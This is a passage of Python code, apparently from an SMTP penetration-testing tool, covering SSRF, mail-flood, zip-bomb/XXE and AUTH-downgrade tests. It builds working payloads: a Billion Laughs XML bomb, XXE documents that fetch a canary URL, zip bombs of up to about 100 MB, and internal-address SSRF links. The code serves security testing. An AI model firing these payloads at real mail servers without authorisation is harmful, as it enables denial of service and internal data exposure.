                f"Date: {time.strftime('%a, %d %b %Y %H:%M:%S +0000', time.gmtime())}\r\n"
                f"X-PT-Test: PTL-SVC-SMTP-SSRF\r\n"
                f'Content-Type: multipart/alternative; boundary="{top_boundary}"\r\n'
                f"\r\n{body}"
            )
            return msg

        for var_name in variants:
            var_path = base_path / "variants" / var_name
            msg_dir = var_path / "messages"
            msg_files = sorted(msg_dir.glob("*.json")) if msg_dir.is_dir() else []
            if not msg_files and var_name not in FALLBACK_VARIANTS:
                continue
            defs_to_use = FALLBACK_VARIANTS.get(var_name, {})
            if msg_files:
                try:
                    with open(msg_files[0], encoding="utf-8") as f:
                        defs_to_use = json.load(f)
                except (json.JSONDecodeError, OSError):
                    pass
            subject = defs_to_use.get("subject", f"SSRF test - {var_name}")
            if var_name == "ssrf_malformed":
                raw_msg = _build_ssrf_malformed_mime(subject)
            elif var_name == "ssrf_nested":
                raw_msg = _build_ssrf_nested_mime(subject)
            else:
                body = defs_to_use.get("body", f"Test: {{CANARY_URL}}")
                body_html = defs_to_use.get("bodyHtml")
                body = body.replace("{{CANARY_URL}}", canary_url)
                if body_html:
                    body_html = body_html.replace("{{CANARY_URL}}", canary_url)
                raw_msg = _build_ssrf_mime(subject, body, body_html)
            smtp, conn_err = _connect_ssrf()
            sent, accepted, rejected, err_count = 0, 0, 0, 0
            smtp_trace: list[str] = []
            if smtp is None:
                err_count = 1
                smtp_trace.append(f"connection failed: {conn_err}")
            else:
                try:
                    smtp.docmd("EHLO", self.fqdn or "ssrf-test.local")
                    smtp.docmd("MAIL", f"FROM:<{mail_from}>")
                    status, reply = smtp.docmd("RCPT", f"TO:<{rcpt}>")
                    if status not in (250, 251):
                        rejected = 1
                        smtp_trace.append(f"RCPT: {status} (rejected)")
                    else:
                        for c in cc_list:
                            s, _ = smtp.docmd("RCPT", f"TO:<{c}>")
                            if s not in (250, 251):
                                break
                        data_status, data_reply = smtp.data(raw_msg)
                        sent = 1
                        if data_status == 250:
                            accepted = 1
                            smtp_trace.append("250 OK (accepted)")
                        elif 400 <= data_status < 500:
                            rejected = 1
                            smtp_trace.append(f"{data_status} (rejected)")
                        else:
                            rejected = 1
                            smtp_trace.append(f"{data_status} (rejected)")
                    try:
                        smtp.quit()
                    except Exception:
                        pass
                except (
                    smtplib.SMTPResponseException,
                    smtplib.SMTPServerDisconnected,
                    ConnectionResetError,
                    BrokenPipeError,
                    OSError,
                    socket.timeout,
                ) as e:
                    err_count = 1
                    smtp_trace.append(f"error: {e}")
                    try:
                        smtp.quit()
                    except Exception:
                        pass
            detail = f"{accepted} accepted, {rejected} rejected, {err_count} error" if sent or err_count else "skipped"
            var_results.append(
                SsrfVariantResult(
                    variant=var_name,
                    sent=max(sent, 1) if (accepted or rejected or err_count) else 0,
                    accepted=accepted,
                    rejected=rejected,
                    error=err_count,
                    smtp_trace=tuple(smtp_trace),
                    detail=detail,
                )
            )

        if incl_internal:
            for internal_url, label in [
                ("http://127.0.0.1/ssrf-pt-test", "internal_127"),
                ("http://localhost/ssrf-pt-test", "internal_localhost"),
                ("http://10.0.0.1/ssrf-pt-test", "internal_10"),
            ]:
                body = f"Test SSRF internal: {internal_url}"
                raw_msg = _build_ssrf_mime(f"SSRF internal - {label}", body, None)
                smtp, conn_err = _connect_ssrf()
                sent, accepted, rejected, err_count = 0, 0, 0, 0
                smtp_trace = []
                if smtp is None:
                    err_count = 1
                    smtp_trace.append(f"connection failed: {conn_err}")
                else:
                    try:
                        smtp.docmd("EHLO", self.fqdn or "ssrf-test.local")
                        smtp.docmd("MAIL", f"FROM:<{mail_from}>")
                        status, _ = smtp.docmd("RCPT", f"TO:<{rcpt}>")
                        if status not in (250, 251):
                            rejected = 1
                            smtp_trace.append(f"RCPT: {status}")
                        else:
                            data_status, _ = smtp.data(raw_msg)
                            sent = 1
                            if data_status == 250:
                                accepted = 1
                                smtp_trace.append("250 OK")
                            else:
                                rejected = 1
                                smtp_trace.append(f"{data_status}")
                        try:
                            smtp.quit()
                        except Exception:
                            pass
                    except Exception as e:
                        err_count = 1
                        smtp_trace.append(str(e))
                        try:
                            smtp.quit()
                        except Exception:
                            pass
                var_results.append(
                    SsrfVariantResult(
                        variant=label,
                        sent=sent or 1,
                        accepted=accepted,
                        rejected=rejected,
                        error=err_count,
                        smtp_trace=tuple(smtp_trace),
                        detail=f"{accepted} accepted, {rejected} rejected, {err_count} error",
                    )
                )

        elapsed = time.perf_counter() - start_time
        total_accepted = sum(v.accepted for v in var_results)
        total_sent = sum(v.sent for v in var_results)
        detail = f"{total_accepted}/{total_sent} variants sent successfully. Check canary for incoming HTTP requests."
        if total_sent == 0:
            detail = "No variants sent; check connection and definitions."
        return SsrfResult(
            manual_verification_required=True,
            canary_url=canary_url,
            variants=tuple(var_results),
            elapsed_sec=elapsed,
            detail=detail,
            verification_instructions=VERIFICATION_INSTRUCTIONS,
        )

    def test_flood(self) -> FloodResult:
        """
        Test FLOOD – queue overload, SIZE extension (PTL-SVC-SMTP-FLOOD).
        Phases: SIZE_CHECK, SIZE_ENFORCEMENT, QUEUE_STRESS.
        Panic stop on 421; secure on 452.
        """
        host = self.args.target.ip
        port = self.args.target.port
        mail_from = self.args.mail_from or f"floodtest@{self.fqdn}"
        mail_from = str(mail_from).strip()
        rcpt = getattr(self.args, "rcpt_to", None)
        rcpt = str(rcpt).strip() if rcpt else None
        flood_count = max(1, min(getattr(self.args, "flood_count", 150), 500))
        flood_timeout = max(10.0, getattr(self.args, "flood_timeout", 90.0))
        skip_size_test = getattr(self.args, "flood_skip_size_test", False)
        start_time = time.perf_counter()
        smtp_trace: list[str] = []
        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls

        def _connect_flood() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL | None, str]:
            try:
                if use_tls:
                    sock = socket.create_connection((host, port), timeout=15)
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                    smtp = smtplib.SMTP(timeout=15)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    st, _ = smtp.getreply()
                    if st != 220:
                        return None, f"Connect: {st}"
                    return smtp, ""
                smtp = smtplib.SMTP(timeout=15)
                st, _ = smtp.connect(host, port)
                if st != 220:
                    return None, f"Connect: {st}"
                if use_starttls:
                    st2, _ = smtp.docmd("STARTTLS")
                    if st2 != 220:
                        return None, f"STARTTLS: {st2}"
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    smtp.helo_resp = None
                    smtp.ehlo_resp = None
                    smtp.esmtp_features = {}
                    smtp.does_esmtp = False
                return smtp, ""
            except Exception as e:
                return None, str(e)

        smtp, conn_err = _connect_flood()
        if smtp is None:
            return FloodResult(
                vulnerable=False, indeterminate=True, partial_protection=False,
                size_advertised=False, size_limit_bytes=None, size_enforced=None,
                messages_sent=0, messages_accepted=0, messages_rejected=0,
                first_rejection_at=None, tarpitting_detected=False,
                elapsed_sec=time.perf_counter() - start_time,
                smtp_trace=("connection failed: " + conn_err,),
                queue_attempts=0,
                flood_notes=(),
                detail=f"Connection failed: {conn_err}",
            )

        try:
            _, ehlo_raw = smtp.ehlo(self.fqdn or "flood-test.local")
            ehlo_str = ehlo_raw.decode(errors="replace") if isinstance(ehlo_raw, bytes) else str(ehlo_raw or "")
            size_limit_bytes = _parse_size_from_ehlo(ehlo_str)
        except Exception:
            ehlo_str = ""
            size_limit_bytes = None
        size_advertised = size_limit_bytes is not None
        size_effective = size_advertised and (size_limit_bytes or 0) > 0
        smtp_trace.append(f"SIZE_CHECK: {'SIZE ' + str(size_limit_bytes or 0) + ' B' if size_advertised else 'not advertised'}")

        size_enforced: bool | None = None
        if size_effective and not skip_size_test:
            try:
                status, reply = smtp.docmd("MAIL", f"FROM:<{mail_from}> SIZE=1099511627776")
                smtp_trace.append(f"SIZE_ENFORCEMENT: MAIL SIZE=1TB -> {status}")
                size_enforced = status == 552
                if status != 552:
                    try:
                        smtp.docmd("RSET")
                    except Exception:
                        pass
            except Exception as e:
                smtp_trace.append(f"SIZE_ENFORCEMENT: error {e}")
                size_enforced = False

        try:
            smtp.quit()
        except Exception:
            pass

        if not rcpt:
            elapsed = time.perf_counter() - start_time
            vuln = not size_effective or (size_limit_bytes == 0) or (size_enforced is False and size_effective)
            no_size_notes: tuple[str, ...] = ()
            if vuln and not size_effective:
                no_size_notes = (
                    "No effective SIZE limit in EHLO — server may accept oversized messages",
                    "Note: SIZE extension is not mandatory per RFC 1870; "
                    "server may enforce limits elsewhere (post-DATA, MTA policy)",
                )
            return FloodResult(
                vulnerable=vuln, indeterminate=False, partial_protection=size_effective and size_enforced and not vuln,
                size_advertised=size_advertised, size_limit_bytes=size_limit_bytes, size_enforced=size_enforced,
                messages_sent=0, messages_accepted=0, messages_rejected=0,
                first_rejection_at=None, tarpitting_detected=False, elapsed_sec=elapsed,
                smtp_trace=tuple(smtp_trace),
                queue_attempts=0,
                flood_notes=no_size_notes,
                detail=f"SIZE {'advertised' if size_advertised else 'not advertised'}; "
                      f"{'enforced' if size_enforced else 'not enforced'}. No -r, QUEUE_STRESS skipped.",
            )

        min_body = "X" * 10
        near_size_body_len = min(int((size_limit_bytes or 26214400) * 0.8), 10 * 1024 * 1024) if size_limit_bytes else 10240
        rtts: list[float] = []
        sent, accepted, rejected = 0, 0, 0
        queue_attempts = 0
        first_rejection_at: int | None = None
        panic_421 = False
        secure_452 = False
        deadline = start_time + flood_timeout

        for idx in range(flood_count):
            if time.perf_counter() > deadline:
                smtp_trace.append(
                    f"QUEUE_STRESS: timeout after {queue_attempts} attempts "
                    f"({sent} DATA completed)"
                )
                break
            queue_attempts += 1
            body_len = near_size_body_len if (idx % 3 == 1 and size_limit_bytes) else len(min_body)
            body = "X" * body_len
            msg = (
                f"From: <{mail_from}>\r\nTo: <{rcpt}>\r\nSubject: FLOOD test {idx+1}\r\n"
                f"MIME-Version: 1.0\r\nContent-Type: text/plain\r\n\r\n{body}\r\n"
            )
            smtp2, _ = _connect_flood()
            if smtp2 is None:
                break
            try:
                smtp2.docmd("EHLO", self.fqdn or "flood-test.local")
                smtp2.docmd("MAIL", f"FROM:<{mail_from}>")
                smtp2.docmd("RCPT", f"TO:<{rcpt}>")
                t0 = time.perf_counter()
                data_status, _ = smtp2.data(msg)
                rtt = time.perf_counter() - t0
                rtts.append(rtt)
                sent += 1
                if data_status == 250:
                    accepted += 1
                else:
                    rejected += 1
                    if first_rejection_at is None:
                        first_rejection_at = idx + 1
                    if data_status == 421:
                        panic_421 = True
                        smtp_trace.append(f"QUEUE_STRESS: 421 at msg {idx+1} - panic stop")
                        try:
                            smtp2.quit()
                        except Exception:
                            pass
                        break
                    if data_status == 452:
                        secure_452 = True
                        smtp_trace.append(f"QUEUE_STRESS: 452 at msg {idx+1} - disk protection")
                        try:
                            smtp2.quit()
                        except Exception:
                            pass
                        break
            except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError, socket.timeout) as e:
                rejected += 1
                if first_rejection_at is None:
                    first_rejection_at = idx + 1
            try:
                smtp2.quit()
            except Exception:
                pass

        tarpitting_detected = False
        if len(rtts) >= 5:
            first_half = sum(rtts[: len(rtts) // 2]) / (len(rtts) // 2)
            last_half = sum(rtts[-len(rtts) // 2 :]) / (len(rtts) // 2)
            if last_half > first_half * 2.0:
                tarpitting_detected = True
        smtp_trace.append(
            f"QUEUE_STRESS: attempts={queue_attempts}, delivered={accepted} (250 OK), "
            f"data_completed={sent} (no TCP error), failed={rejected} (non-250 or disconnect/timeout)"
        )

        elapsed = time.perf_counter() - start_time
        vuln = (
            not size_effective
            or (size_limit_bytes == 0)
            or (size_enforced is False and size_effective)
            or (accepted >= flood_count * 0.9 and not secure_452 and not panic_421)
        )
        partial = (
            (size_effective and size_enforced)
            or tarpitting_detected
            or secure_452
            or panic_421
            or (first_rejection_at is not None and first_rejection_at < flood_count)
        ) and not vuln
        flood_notes: tuple[str, ...] = ()
        if vuln and not size_effective:
            flood_notes = (
                "No effective SIZE limit in EHLO — server may accept oversized messages",
                "Note: SIZE extension is not mandatory per RFC 1870; "
                "server may enforce limits elsewhere (post-DATA, MTA policy)",
            )
        detail_parts = []
        if size_effective:
            detail_parts.append(f"SIZE {size_limit_bytes} B advertised")
        else:
            detail_parts.append("SIZE not advertised")
        if size_enforced is not None:
            detail_parts.append("enforced" if size_enforced else "not enforced")
        detail_parts.append(
            f"queue: attempts={queue_attempts}, delivered={accepted}, "
            f"data_completed={sent}, failed={rejected}"
        )
        if tarpitting_detected:
            detail_parts.append("tarpitting detected")
        if secure_452:
            detail_parts.append("452 disk protection")
        if panic_421:
            detail_parts.append("421 panic stop")
        return FloodResult(
            vulnerable=vuln, indeterminate=False, partial_protection=partial,
            size_advertised=size_advertised, size_limit_bytes=size_limit_bytes, size_enforced=size_enforced,
            messages_sent=sent, messages_accepted=accepted, messages_rejected=rejected,
            first_rejection_at=first_rejection_at, tarpitting_detected=tarpitting_detected,
            elapsed_sec=elapsed, smtp_trace=tuple(smtp_trace),
            queue_attempts=queue_attempts,
            flood_notes=flood_notes,
            detail="; ".join(detail_parts),
        )

    def _get_zipxxe_definitions_path(self) -> Path:
        """Base path for ZIPXXE variant definitions."""
        return Path(__file__).resolve().parent.parent / "tests" / "smtp" / "zipxxe"

    def test_zipxxe(self) -> ZipxxeResult:
        """
        Test Zip Bomb, XML Entity Expansion (Billion Laughs), XXE in ZIP/OOXML (PTL-SVC-SMTP-ZIPXXE).
        Sends emails with malicious attachments/body. User monitors server and canary for impact.
        """
        host = self.args.target.ip
        port = self.args.target.port
        rcpt = str(self.args.rcpt_to).strip()
        canary_url = str(getattr(self.args, "zipxxe_canary_url", "") or "").strip()
        mail_from = self.args.mail_from or f"zipxxetest@{self.fqdn}"
        mail_from = str(mail_from).strip()
        from_name = getattr(self.args, "from_name", None) or ""
        timeout = max(5.0, getattr(self.args, "zipxxe_timeout", 30.0))
        variants_arg = getattr(self.args, "zipxxe_variants", None)
        incl_zip_bomb = getattr(self.args, "zipxxe_zip_bomb", False)
        incl_zip_bomb_full = getattr(self.args, "zipxxe_zip_bomb_full", False)
        default_variants = ["billion_laughs_attach", "billion_laughs_body", "xxe_zip", "xxe_docx", "xxe_body"]
        if variants_arg:
            variants = [v.strip().lower() for v in variants_arg.split(",") if v.strip()]
        else:
            variants = list(default_variants)
        if incl_zip_bomb and "zip_bomb" not in variants:
            variants.append("zip_bomb")
        if incl_zip_bomb_full and "zip_bomb_full" not in variants:
            variants.append("zip_bomb_full")

        BILLION_LAUGHS_XML = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

        def _xxe_xml_template(url: str) -> str:
            return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]>
<document><content>&xxe;</content></document>'''

        def _build_zip_with_xxe(url: str) -> bytes:
            bio = BytesIO()
            xml_content = _xxe_xml_template(url).encode("utf-8")
            with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("report.xml", xml_content)
            return bio.getvalue()

        def _build_minimal_docx_with_xxe(url: str) -> bytes:
            """Minimal OOXML .docx with XXE in word/document.xml."""
            xml_content = _xxe_xml_template(url).encode("utf-8")
            bio = BytesIO()
            with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("[Content_Types].xml", (
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                    '<Default Extension="xml" ContentType="application/xml"/>'
                    '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
                    '</Types>'
                ).encode("utf-8"))
                zf.writestr("_rels/.rels", (
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
                    '</Relationships>'
                ).encode("utf-8"))
                zf.writestr("word/document.xml", xml_content)
            return bio.getvalue()

        def _build_minimal_zip_bomb() -> bytes:
            """Minimal zip bomb: ~200KB compressed → moderate expansion (low DoS risk for testing)."""
            bio = BytesIO()
            data = b"\x00" * (10 * 1024)
            with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
                for i in range(20):
                    zf.writestr(f"layer_{i}.bin", data)
            return bio.getvalue()

        def _build_full_zip_bomb() -> bytes:
            """Full zip bomb: ~100KB compressed → ~100MB expanded (extreme ratio, high DoS risk).
            Uses 10 files of 10MB zeros each; deflate achieves ~1000:1 for repeated bytes."""
            bio = BytesIO()
            chunk = b"\x00" * (1024 * 1024)  # 1 MB
            data_10mb = chunk * 10  # 10 MB
            with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
                for i in range(10):
                    zf.writestr(f"bomb_{i}.bin", data_10mb)
            return bio.getvalue()

        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls
        from_hdr = f'"{from_name}" <{mail_from}>' if from_name else f"<{mail_from}>"
        start_time = time.perf_counter()
        var_results: list[ZipxxeVariantResult] = []
        VERIFICATION_INSTRUCTIONS = (
            "Monitor server CPU, memory, disk, SMTP responsiveness. For XXE variants, check canary for HTTP requests. "
            "FAIL if significant slowdown, freeze, restart, or disk exhaustion occurs."
        )

        def _connect_zipxxe() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL | None, str]:
            try:
                if use_tls:
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock = socket.create_connection((host, port), timeout=min(30.0, timeout))
                    sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                    smtp = smtplib.SMTP(timeout=timeout)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    st, _ = smtp.getreply()
                    if st != 220:
                        return None, f"Connect: {st}"
                    return smtp, ""
                smtp = smtplib.SMTP(timeout=timeout)
                st, _ = smtp.connect(host, port)
                if st != 220:
                    return None, f"Connect: {st}"
                if use_starttls:
                    st2, _ = smtp.docmd("STARTTLS")
                    if st2 != 220:
                        return None, f"STARTTLS: {st2}"
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    smtp.helo_resp = None
                    smtp.ehlo_resp = None
                    smtp.esmtp_features = {}
                    smtp.does_esmtp = False
                return smtp, ""
            except Exception as e:
                return None, str(e)

        def _build_mime_with_attachment(subject: str, body: str, attachment_data: bytes, filename: str, content_type: str = "application/octet-stream") -> str:
            msg = MIMEMultipart("mixed")
            msg["Subject"] = subject
            msg["From"] = from_hdr
            msg["To"] = f"<{rcpt}>"
            msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
            msg["X-PT-Test"] = "PTL-SVC-SMTP-ZIPXXE"
            msg.attach(MIMEText(body, "plain", "utf-8"))
            part = MIMEBase(*content_type.split("/", 1))
            part.set_payload(attachment_data)
            encode_base64(part)
            part.add_header("Content-Disposition", "attachment", filename=filename)
            msg.attach(part)
            return msg.as_string()

        for var_name in variants:
            if var_name in ("xxe_zip", "xxe_docx", "xxe_body") and not canary_url:
                continue
            smtp, conn_err = _connect_zipxxe()
            sent, accepted, rejected, err_count = 0, 0, 0, 0
            smtp_trace: list[str] = []
            if smtp is None:
                err_count = 1
                smtp_trace.append(f"connection failed: {conn_err}")
            else:
                try:
                    subject = f"ZIPXXE test - {var_name} (PTL-SVC-SMTP-ZIPXXE)"
                    body = "ZIPXXE test message. Monitor server and canary."
                    if var_name == "billion_laughs_attach":
                        raw_msg = _build_mime_with_attachment(
                            subject, body, BILLION_LAUGHS_XML.encode("utf-8"), "billion_laughs.xml", "application/xml"
                        )
                    elif var_name == "billion_laughs_body":
                        raw_msg = (
                            f"From: {from_hdr}\r\n"
                            f"To: <{rcpt}>\r\n"
                            f"Subject: {subject}\r\n"
                            f"MIME-Version: 1.0\r\n"
                            f"Content-Type: application/xml; charset=utf-8\r\n"
                            f"Date: {time.strftime('%a, %d %b %Y %H:%M:%S +0000', time.gmtime())}\r\n"
                            f"X-PT-Test: PTL-SVC-SMTP-ZIPXXE\r\n"
                            f"\r\n{BILLION_LAUGHS_XML}"
                        )
                    elif var_name == "xxe_zip":
                        zip_data = _build_zip_with_xxe(canary_url)
                        raw_msg = _build_mime_with_attachment(
                            subject, body, zip_data, "report.zip", "application/zip"
                        )
                    elif var_name == "xxe_docx":
                        docx_data = _build_minimal_docx_with_xxe(canary_url)
                        raw_msg = _build_mime_with_attachment(
                            subject, body, docx_data, "document.docx",
                            "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
                        )
                    elif var_name == "xxe_body":
                        xxe_body_xml = _xxe_xml_template(canary_url)
                        raw_msg = (
                            f"From: {from_hdr}\r\n"
                            f"To: <{rcpt}>\r\n"
                            f"Subject: {subject}\r\n"
                            f"MIME-Version: 1.0\r\n"
                            f"Content-Type: application/xml; charset=utf-8\r\n"
                            f"Date: {time.strftime('%a, %d %b %Y %H:%M:%S +0000', time.gmtime())}\r\n"
                            f"X-PT-Test: PTL-SVC-SMTP-ZIPXXE\r\n"
                            f"\r\n{xxe_body_xml}"
                        )
                    elif var_name == "zip_bomb":
                        zip_data = _build_minimal_zip_bomb()
                        raw_msg = _build_mime_with_attachment(
                            subject, "ZIPXXE zip bomb test (minimal). Monitor server resources.", zip_data, "zipbomb.zip", "application/zip"
                        )
                    elif var_name == "zip_bomb_full":
                        zip_data = _build_full_zip_bomb()
                        raw_msg = _build_mime_with_attachment(
                            subject, "ZIPXXE full zip bomb (~100KB→~100MB). Monitor server! DoS risk.", zip_data, "zipbomb_full.zip", "application/zip"
                        )
                    else:
                        continue
                    smtp.docmd("EHLO", self.fqdn or "zipxxe-test.local")
                    smtp.docmd("MAIL", f"FROM:<{mail_from}>")
                    status, reply = smtp.docmd("RCPT", f"TO:<{rcpt}>")
                    if status not in (250, 251):
                        rejected = 1
                        smtp_trace.append(f"RCPT: {status} (rejected)")
                    else:
                        data_status, _ = smtp.data(raw_msg)
                        sent = 1
                        if data_status == 250:
                            accepted = 1
                            smtp_trace.append("250 OK (accepted)")
                        else:
                            rejected = 1
                            smtp_trace.append(f"{data_status} (rejected)")
                    try:
                        smtp.quit()
                    except Exception:
                        pass
                except (
                    smtplib.SMTPResponseException,
                    smtplib.SMTPServerDisconnected,
                    ConnectionResetError,
                    BrokenPipeError,
                    OSError,
                    socket.timeout,
                ) as e:
                    err_count = 1
                    smtp_trace.append(f"error: {e}")
                    try:
                        if smtp:
                            smtp.quit()
                    except Exception:
                        pass
            detail = f"{accepted} accepted, {rejected} rejected, {err_count} error" if sent or err_count else "skipped"
            var_results.append(
                ZipxxeVariantResult(
                    variant=var_name,
                    sent=max(sent, 1) if (accepted or rejected or err_count) else 0,
                    accepted=accepted,
                    rejected=rejected,
                    error=err_count,
                    smtp_trace=tuple(smtp_trace),
                    detail=detail,
                )
            )

        elapsed = time.perf_counter() - start_time
        total_accepted = sum(v.accepted for v in var_results)
        total_sent = sum(v.sent for v in var_results)

        def _rejected_at_rcpt(v: ZipxxeVariantResult) -> bool:
            if v.error:
                return False
            return any(
                ln.startswith("RCPT:") and "rejected" in ln.lower()
                for ln in v.smtp_trace
            )

        all_rejected_at_rcpt = (
            len(var_results) > 0 and all(_rejected_at_rcpt(v) for v in var_results)
        )

        if total_sent == 0:
            detail = "No variants sent; check connection."
        else:
            detail = f"{total_accepted}/{total_sent} variants with successful DATA (250 OK)."
        return ZipxxeResult(
            manual_verification_required=True,
            canary_url=canary_url or "",
            variants=tuple(var_results),
            elapsed_sec=elapsed,
            detail=detail,
            verification_instructions=VERIFICATION_INSTRUCTIONS,
            all_rejected_at_rcpt=all_rejected_at_rcpt,
        )

    def _get_smtp_for_auth_downgrade(self) -> tuple[smtplib.SMTP, str]:
        """
        Get SMTP connection with AUTH over TLS (STARTTLS or implicit).
        For port 25/587: upgrade via STARTTLS if not already encrypted.
        """
        smtp = self.get_smtp_handler()
        _, ehlo_bytes = smtp.ehlo(self.fqdn)
        ehlo = ehlo_bytes.decode() if ehlo_bytes else ""

        auth_methods = _get_auth_methods_from_ehlo(ehlo)
        needs_starttls = (
            "STARTTLS" in ehlo.upper()
            and self.args.target.port != 465
            and not self.args.tls
            and not self.args.starttls
        )
        if needs_starttls:
            status, _ = smtp.docmd("STARTTLS")
            if status == 220:
                ctx = ssl._create_unverified_context()
                try:
                    _is_ip = ipaddress.ip_address(self.args.target.ip)
                    server_hostname = None
                except ValueError:
                    server_hostname = self.args.target.ip
                sock_ssl = ctx.wrap_socket(smtp.sock, server_hostname=server_hostname)
                smtp.sock = sock_ssl
                smtp.file = None
                smtp.helo_resp = None
                smtp.ehlo_resp = None
                smtp.esmtp_features = {}
                smtp.does_esmtp = False
                _, ehlo_bytes = smtp.ehlo(self.fqdn)
                ehlo = ehlo_bytes.decode() if ehlo_bytes else ""

        return smtp, ehlo

    def test_auth_downgrade(self) -> AuthDowngradeResult:
        """
        Test AUTH downgrade: server changes AUTH offer after failed authentication.
        RFC 4954: session state undefined after failed AUTH; RSET before second EHLO.
        """
        WEAK_METHODS = {"PLAIN", "LOGIN"}
        AUTH_TRIGGER_PREFERENCE = ["XOAUTH2", "OAUTHBEARER", "SCRAM-SHA-256", "SCRAM-SHA-1", "PLAIN"]

        try:
            smtp, ehlo_before = self._get_smtp_for_auth_downgrade()
        except Exception as e:
            return AuthDowngradeResult(
                vulnerable=False,
                weakness=False,
                indeterminate=True,
                info_defensive=False,
                methods_before=[],
                methods_after=[],
                auth_method_used="",
                server_response=None,
                detail=f"Connection failed: {e}",
                rset_ok=None,
            )

        methods_before = sorted(_get_auth_methods_from_ehlo(ehlo_before))
        if not methods_before:
            return AuthDowngradeResult(
                vulnerable=False,
                weakness=False,
                indeterminate=True,
                info_defensive=False,
                methods_before=[],
                methods_after=[],
                auth_method_used="",
                server_response=None,
                detail="Server does not advertise AUTH",
                rset_ok=None,
            )

        auth_method_used = None
        for method in AUTH_TRIGGER_PREFERENCE:
            if method in {m.upper() for m in methods_before}:
                auth_method_used = method
                break
        if not auth_method_used:
            auth_method_used = methods_before[0] if methods_before else "PLAIN"

        bogus_token = self._AUTH_DOWNGRADE_BOGUS_XOAUTH2
        if auth_method_used == "PLAIN":
            bogus_token = b64encode(b"\x00test\x00test").decode()
        elif auth_method_used in ("OAUTHBEARER", "XOAUTH2"):
            bogus_token = self._AUTH_DOWNGRADE_BOGUS_XOAUTH2

        server_response: str | None = None
        try:
            try:
                code, resp = smtp.docmd("AUTH", f"{auth_method_used} {bogus_token}")
            except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError) as e:
                return AuthDowngradeResult(
                    vulnerable=False,
                    weakness=False,
                    indeterminate=True,
                    info_defensive=False,
                    methods_before=methods_before,
                    methods_after=[],
                    auth_method_used=auth_method_used,
                    server_response=str(e),
                    detail="Connection closed after failed auth (defensive reaction)",
                    rset_ok=None,
                )
            server_response = f"[{code}] {self.bytes_to_str(resp)}".strip() if resp else str(code)

            if code == 421:
                return AuthDowngradeResult(
                    vulnerable=False,
                    weakness=False,
                    indeterminate=True,
                    info_defensive=False,
                    methods_before=methods_before,
                    methods_after=[],
                    auth_method_used=auth_method_used,
                    server_response=server_response,
                    detail="Server closed session (421) after failed auth",
                    rset_ok=None,
                )

            try:
                smtp.docmd("RSET")
            except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError) as e:
                return AuthDowngradeResult(
                    vulnerable=False,
                    weakness=False,
                    indeterminate=True,
                    info_defensive=False,
                    methods_before=methods_before,
                    methods_after=[],
                    auth_method_used=auth_method_used,
                    server_response=server_response,
                    detail="Connection closed after RSET (server may have terminated session on RSET)",
                    rset_ok=False,
                )

            try:
                _, ehlo_after_bytes = smtp.ehlo(self.fqdn)
